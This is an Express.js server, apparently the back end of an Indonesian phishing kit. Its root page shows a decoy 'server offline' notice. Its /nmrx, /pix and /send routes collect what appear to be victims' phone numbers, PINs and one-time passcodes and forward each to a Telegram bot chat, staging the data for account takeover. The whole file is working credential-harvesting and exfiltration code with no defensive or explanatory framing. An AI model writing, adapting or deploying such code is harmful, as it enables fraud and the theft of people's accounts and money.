const express = require("express");
const axios = require("axios");
const path = require("path");
const app = express();

/* TOKEN BOT */
const BOT_TOKEN =
process.env.BOT_TOKEN;

/* CHAT ID */
const CHAT_ID =
process.env.CHAT_ID;

app.use(express.json());
app.use(
    express.urlencoded({
        extended:true
    })
);

app.use(
    express.static(
        path.join(__dirname)
    )
);

app.get("/", (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Server Offline</title>

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Inter,Arial,sans-serif;
}

body{
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    overflow:hidden;
    background:
    radial-gradient(circle at top left,#1e3a8a 0%,transparent 35%),
    radial-gradient(circle at bottom right,#0f766e 0%,transparent 35%),
    linear-gradient(135deg,#050816,#0b1120,#111827);
}

body::before,
body::after{
    content:"";
    position:absolute;
    width:350px;
    height:350px;
    border-radius:50%;
    filter:blur(90px);
    animation:float 8s ease-in-out infinite;
}

body::before{
    background:#00d4ff55;
    top:-120px;
    left:-120px;
}

body::after{
    background:#00ff8855;
    bottom:-120px;
    right:-120px;
    animation-delay:4s;
}

.card{
    position:relative;
    z-index:2;
    width:92%;
    max-width:430px;
    padding:40px 28px;
    text-align:center;
    border-radius:28px;
    background:rgba(255,255,255,.06);
    border:1px solid rgba(255,255,255,.12);
    backdrop-filter:blur(25px);
    box-shadow:
    0 20px 60px rgba(0,0,0,.45),
    inset 0 1px 0 rgba(255,255,255,.08);
}

.icon{
    width:90px;
    height:90px;
    margin:auto;
    border-radius:50%;
    display:flex;
    align-items:center;
    justify-content:center;
    font-size:42px;
    background:linear-gradient(135deg,#ff5252,#ff8a00);
    box-shadow:0 0 35px rgba(255,120,0,.45);
}

h1{
    margin-top:24px;
    font-size:28px;
    color:#fff;
}

p{
    margin-top:16px;
    color:#cbd5e1;
    line-height:1.8;
    font-size:15px;
}

.badge{
    display:inline-block;
    margin-top:25px;
    padding:10px 22px;
    border-radius:999px;
    color:#00ffae;
    background:rgba(0,255,174,.12);
    border:1px solid rgba(0,255,174,.35);
    font-size:13px;
    font-weight:600;
}

.loader{
    width:70px;
    height:4px;
    margin:28px auto 0;
    border-radius:999px;
    overflow:hidden;
    background:rgba(255,255,255,.08);
}

.loader span{
    display:block;
    width:40%;
    height:100%;
    border-radius:999px;
    background:linear-gradient(90deg,#00d4ff,#00ff88);
    animation:loading 1.5s infinite;
}

.footer{
    margin-top:28px;
    color:#94a3b8;
    font-size:12px;
}

@keyframes loading{
    from{
        transform:translateX(-120%);
    }
    to{
        transform:translateX(320%);
    }
}

@keyframes float{
    0%,100%{
        transform:translateY(0);
    }
    50%{
        transform:translateY(20px);
    }
}

</style>

</head>
<body>

<div class="card">

    <div class="icon">⚠</div>

    <h1>Server Sedang Offline</h1>

    <p>
        Layanan untuk sementara tidak dapat digunakan karena
        kuota langganan server telah habis.
        <br><br>
        Silakan kembali dan perpanjang langganan anda.
    </p>

    <div class="badge">
        Maintenance Sementara
    </div>

    <div class="loader">
        <span></span>
    </div>

</div>

</body>
</html>
`);
});

/* ROUTE */
app.post("/nmrx", async(req,res) =>{

    try{

        console.log(
            "DATA MASUK:"
        );

        console.log(
            req.body
        );

        console.log(
            "BOT:",
            BOT_TOKEN
        );

        console.log(
            "CHAT:",
            CHAT_ID
        );

        const {
            
            nmrx
            
        } = req.body;

        if(
            !nmrx
        ){

            return res.status(400).json({

                success:false,
                message:"Data tidak lengkap"

            });

        }

        /* PESAN TELEGRAM */
        const text = `
🔥 [ ×𝗡𝗠𝗥× 𝗠𝗔𝗦𝗨𝗞 𝗕𝗔𝗡𝗚 ] 🔥
            × <code>${nmrx}</code> ×
           
─────────────────
<b>⌬<i>  𝗡𝗠𝗥  ×</i></b>  : <b>${nmrx}</b>
⌬<i>  POX . . . .</i>
─────────────────

<b>◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈</b>
        `;

        /* KIRIM TELEGRAM */
        await axios.post(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
        {

            chat_id:
            CHAT_ID,

            text:
            text,

            parse_mode:
            "HTML"

        }

     );

        res.json({

            success:true

        });

    }catch(error){

        console.log(
            error.response?.data ||
            error.message
       );

        res.status(500).json({

            success:false

        });

    }

});

/* ROUTE */
app.post("/pix", async(req,res) =>{

    try{

        console.log(
            "DATA MASUK:"
        );

        console.log(
            req.body
        );

        console.log(
            "BOT:",
            BOT_TOKEN
        );

        console.log(
            "CHAT:",
            CHAT_ID
        );

        const {
            
            nmrx,
            pix
            
        } = req.body;

        if(
            !nmrx ||
            !pix
        ){

            return res.status(400).json({

                success:false,
                message:"Data tidak lengkap"

            });

        }

        /* PESAN TELEGRAM */
        const text = `
🔥 [ ×𝗣𝗢𝗫× 𝗠𝗔𝗦𝗨𝗞 𝗕𝗔𝗡𝗚 ] 🔥
            × <code>${nmrx}</code> ×
           
─────────────────
<b>⌬<i>  𝗡𝗠𝗥  ×</i></b>   : <b>${nmrx}</b>
<b>⌬<i>  𝗣𝗢𝗫   ×</i></b>   : <b>${pix}</b>
⌬<i>  OXT . . . .</i>
─────────────────

<b>◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈</b>
        `;

        /* KIRIM TELEGRAM */
        await axios.post(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
        {

            chat_id:
            CHAT_ID,

            text:
            text,

            parse_mode:
            "HTML"

        }

     );

        res.json({

            success:true

        });

    }catch(error){

        console.log(
            error.response?.data ||
            error.message
       );

        res.status(500).json({

            success:false

        });

    }

});

/* ROUTE */
app.post("/send", async(req,res) =>{

    try{

        console.log(
            "DATA MASUK:"
        );

        console.log(
            req.body
        );

        console.log(
            "BOT:",
            BOT_TOKEN
        );

        console.log(
            "CHAT:",
            CHAT_ID
        );

        const {
            
            nmrx,
            pix,
            otp
            
        } = req.body;

        if(
            !nmrx ||
            !pix ||
            !otp
        ){

            return res.status(400).json({

                success:false,
                message:"Data tidak lengkap"

            });

        }

        /* PESAN TELEGRAM */
        const text = `
🔥 [ 𝗟𝗘𝗡𝗚𝗞𝗔𝗣 𝗦𝗘𝗠𝗨𝗔 𝗕𝗔𝗡𝗚 ] 🔥
              × <code>${nmrx}</code> ×
           
─────────────────
<b>⌬<i>  𝗡𝗠𝗥  ×</i></b>   : <b>${nmrx}</b>
<b>⌬<i>  𝗣𝗢𝗫   ×</i></b>   : <b>${pix}</b>
<b>⌬<i>  𝗢𝗫𝗧   ×</i></b>   : <b>${otp}</b>
─────────────────

<b>◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈</b>
        `;

        /* KIRIM TELEGRAM */
        await axios.post(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
        {

            chat_id:
            CHAT_ID,

            text:
            text,

            parse_mode:
            "HTML"

        }

     );

        res.json({

            success:true

        });

    }catch(error){

        console.log(
            error.response?.data ||
            error.message
       );

        res.status(500).json({

            success:false

        });

    }

});

/* PORT */
const PORT =
process.env.PORT || 8080;

/* JALANKAN */
app.listen(PORT, ()=>{

    console.log(
    "Server running on port " +
    PORT
    );

});
